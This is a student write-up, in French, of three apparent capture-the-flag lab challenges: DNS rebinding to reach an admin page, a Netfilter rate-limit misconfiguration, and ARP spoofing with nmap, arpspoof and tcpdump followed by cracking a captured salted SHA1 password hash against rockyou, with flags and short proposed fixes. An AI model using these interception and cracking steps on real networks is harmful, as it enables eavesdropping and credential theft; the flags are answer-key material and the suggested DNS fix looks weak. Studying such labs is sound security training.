I. DNS Rebinding

🌞 Write-up de l'épreuve

```
1. Qu'est-ce qu'un DNS rebinding ?
Le DNS rebinding est une attaque qui contourne la SOP (Same-Origin Policy). Elle exploite le TTL (Time To Live), qui détermine combien de temps une IP est mise en cache pour un domaine. En forçant un site à interroger un serveur DNS malveillant, un attaquant peut manipuler le site pour qu'il se connecte à des IP locales et exécute du code malveillant sur le réseau cible.

2. Exemple d'attaque
Dans l'exemple décrit, une application web vérifie si une IP est publique ou locale pour restreindre l'accès à une page admin. L'attaquant utilise une bibliothèque DNS rebinding (rbndr) pour générer une URL qui pointe à la page admin via une IP locale. Grâce à des TTL faibles et plusieurs requêtes, l'attaquant parvient à contourner les vérifications et accéder à la page admin.
```

```
On peut réaliser l'attaque dns rebinding grace à ce site: https://lock.cmpxchg8b.com/rebinder.html

7f000001.c0a80001.rbndr.us:54022/admin
```
```
On fais plusieurs requette dns jusqu'à rentrer dans la page admin
```

```
flag:
u1reSog00dWizDNSR3bindindon
```

🌞 Proposer une version du code qui n'est pas vulnérable

```
import ipaddress
import socket

TRUSTED_DOMAINS = ['example.com', 'secure-site.com']

def is_valid_ip(ip):
    try:
        return ipaddress.ip_address(ip).is_global
    except ValueError:
        return False

def is_valid_fqdn(fqdn):
    try:
        resolved_ip = socket.gethostbyname(fqdn)
        return is_valid_ip(resolved_ip) and (fqdn in TRUSTED_DOMAINS if TRUSTED_DOMAINS else True)
    except socket.gaierror:
        return False

```

II. Netfilter erreurs courantes

🌞 Write-up de l'épreuve

```
Erreur de code
IP46T -A INPUT-HTTP -m limit —limit 3/sec —limit-burst 20 -j DROP
IP46T -A INPUT-HTTP -j ACCEPT

On curl plusieurs fois
```

🌞 Proposer un jeu de règles firewall

```
Nicely done :)

There are probably a few things the administrator was missing when writing this
ruleset :

1) When a rule does not match, the next one is tested against

2) When jumped in a user defined chain, if there is no match, then the
search resumes at the next rule in the previous (calling) chain

3) The ’limit’ match is used to limit the rate at which a given rule can
match : above this limit, 1) applies

4) When a rule with a ’terminating’ target (e.g. : ACCEPT, DROP...) matches
a packet, then the search stops : the packet won’t be tested against any
other rules

The flag is : saperlipopete
```


III. ARP Spoofing Ecoute active

🌞 Write-up de l'épreuve

```
root@fac50de5d760:~# nmap -sn -PR  172.18.0.0/16 --min-parallelism 10 -oN scan_result.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-30 10:20 UTC
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 4096 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 3.15% done; ETC: 10:20 (0:00:00 remaining)
Stats: 0:00:05 elapsed; 0 hosts completed (0 up), 4096 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 43.15% done; ETC: 10:20 (0:00:07 remaining)
Stats: 0:00:10 elapsed; 0 hosts completed (0 up), 4096 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 92.72% done; ETC: 10:20 (0:00:01 remaining)
Nmap scan report for 172.18.0.1
Host is up (0.000018s latency).
MAC Address: 02:42:4A:E5:49:79 (Unknown)
Nmap scan report for db.arp-spoofing-dist-2_default 🌞(172.18.0.3)🌞
Host is up (0.000014s latency).
MAC Address: 02:42:AC:12:00:03 (Unknown)
Nmap scan report for client.arp-spoofing-dist-2_default 🌞(172.18.0.4)🌞
Host is up (0.000037s latency).
MAC Address: 02:42:AC:12:00:04 (Unknown)
Nmap scan report for fac50de5d760 (172.18.0.2)
Host is up.
```

```
root@fac50de5d760:~# nmap -p- 172.18.0.2
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-30 10:55 UTC
Nmap scan report for client.arp-spoofing-dist-2_default (172.18.0.2)
Host is up (0.000019s latency).
All 65535 scanned ports on client.arp-spoofing-dist-2_default (172.18.0.2) are closed
MAC Address: 02:42:AC:12:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.66 seconds


root@fac50de5d760:~# nmap -p- 172.18.0.4
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-30 10:55 UTC
Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.4)
Host is up (0.000020s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
🌞3306/tcp open  mysql🌞
MAC Address: 02:42:AC:12:00:04 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.83 seconds
root@fac50de5d760:~#
```

```
root@fac50de5d760:~# arpspoof -i eth0 -t 172.18.0.2 172.18.0.4
2:42:ac:12:0:3 2:42:ac:12:0:2 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:2 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:3

root@fac50de5d760:~# arpspoof -i eth0 -t 172.18.0.4 172.18.0.2
2:42:ac:12:0:3 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.2 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.2 is-at 2:42:ac:12:0:3
```

```
root@fac50de5d760:~# tcpdump -i eth0 not port 22 -n -nn
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
11:34:24.669822 ARP, Reply 172.18.0.4 is-at 02:42:ac:12:00:03, length 28
11:34:25.428337 ARP, Reply 172.18.0.2 is-at 02:42:ac:12:00:03, length 28
11:34:26.670221 ARP, Reply 172.18.0.4 is-at 02:42:ac:12:00:03, length 28
```


```
root@fac50de5d760:~# tcpdump -i eth0 not port 22 -w yoyo.pcap
tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
^C208 packets captured
209 packets received by filter
0 packets dropped by kernel
```

```
root@fac50de5d760:~# tcpdump -i eth0 not port 22 -n -nn
```

```
Voir arpspoofing.pcap
```

```
vincent@debian:~$ odd-crack 'hex(sha1_raw($p)+sha1_raw($s.sha1_raw(sha1_raw($p))))' --salt hex:2d0b063e696a68582529680c402a21776f777862 Téléchargements/rockyou.txt 0907f80d40a6fa807c59dece79af83f7d988b141
[*] loading file...
[*] found heyheyhey=0907f80d40a6fa807c59dece79af83f7d988b141
[*] all hashes found, shutdown requested
[*] done, tried 4700 passwords

l1tter4lly_4_c4ptur3_th3_fl4g:heyheyhey
```

🌞 Proposer une configuration pour empêcher votre attaque

```
Une configuration possible serai le chiffrage des données
```